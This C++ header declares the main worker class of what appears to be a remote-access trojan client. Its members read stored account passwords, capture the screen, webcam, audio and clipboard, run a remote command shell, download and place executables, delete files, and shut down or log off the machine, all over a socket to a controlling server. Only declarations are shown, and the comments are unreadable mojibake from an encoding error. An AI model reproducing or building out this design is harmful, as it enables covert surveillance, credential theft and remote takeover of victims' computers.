#pragma once

#include "ModuleSocket.h"
#include "SystemInfo.h"
#include "Disk.h"
#include "FileInfo.h"
#include "CmdShell.h"
#include "ChatMsgDlg.h"
#include "TaskManager.h"
#include "ReadPsw.h"
#include "Screen.h"
#include "ViewVideo.h"
#include "AudioManager.h"

//����������߳���
class CWorkThreadMain
{
public:
	CWorkThreadMain(void);
	~CWorkThreadMain(void);
    
	 void GetSysInfo();  //�õ��⼦�����Ļ���������Ϣ
     SOCKET Run();       //����
	 void ShakeHandCheck(IN const SOCKET Sock, OUT bool* pbSuccess);
	 void ExecCommand(IN const SOCKET l_Socket);  //ִ������
	 bool m_bRunFlag;   //״̬���
	 int m_nTime;
private:
	CModuleSocket m_moduleSocket;
	CSystemInfo   m_sysInfo;        //����ϵͳ������Ϣ��
	CDisk m_diskInfo;               //�����ļ���
	CFileInfo m_fileInfo;           //�ļ���
	CCmdShell m_cmdShell;           //CMD��
    CChatMsgDlg m_ChatMsgDlg;       //������Ϣ�Ի���
	CTaskManager m_TaskManager;     //���������
	CReadPsw    m_readPsw;          //��ȡ�ʺ����������
	CScreen     m_Screen;           //��Ļ������
	HANDLE      m_hThread;
	CAudioManager m_AudioManager;   //������

	SOCKET m_socket;                //�ͷ�����ͨ��socket
	char m_szIpAddr[IPADDR_SIZE];   //ip��ַ
	static DWORD WINAPI ToDownFileProc(LPVOID lpParamter);
	static DWORD WINAPI DeleteTargetFileProc( LPVOID lpParamter);  //ɾ���ļ����ļ��� 
	static DWORD WINAPI SenCmdProc(LPVOID lpParameter);  //��������
	static DWORD WINAPI InitCmdProc(LPVOID lpParameter);  //��ʼ���ܵ�

	static DWORD WINAPI InitChatMsgDlgProc(LPVOID lpParameter);  //��ʼ������Ի���
	static DWORD WINAPI SendScreeProc(LPVOID lpParameter);  //������Ļ��Ϣ
	static DWORD WINAPI SendVideoProc(LPVOID lpParameter);  //����������Ϣ
	static DWORD WINAPI DealBroadCastProc(LPVOID lpParameter);  //Զ������㲥
	static DWORD WINAPI SendClipBoardProc(LPVOID lpParameter);  //���ͼ���������
private:
	void ExecShutdown();   //�ػ�
	void ExecLogoff(); /*ע�� */
	void ExecRestart();  //����
	void ExecOperarotr(IN const UINT nCommond);
	CString DownloadFile(IN const CString strWebPath, OUT CString& strExePath, OUT bool* pbSuccess);   //�ļ�����
    UINT32 GetProgramPath( OUT CString& strPath, OUT bool* bSuccess);  //��ȡProgram·��
	void DealDesktopInfo(IN const DESKTOPINFO_S tagDesktopInfo);  //���������������
};
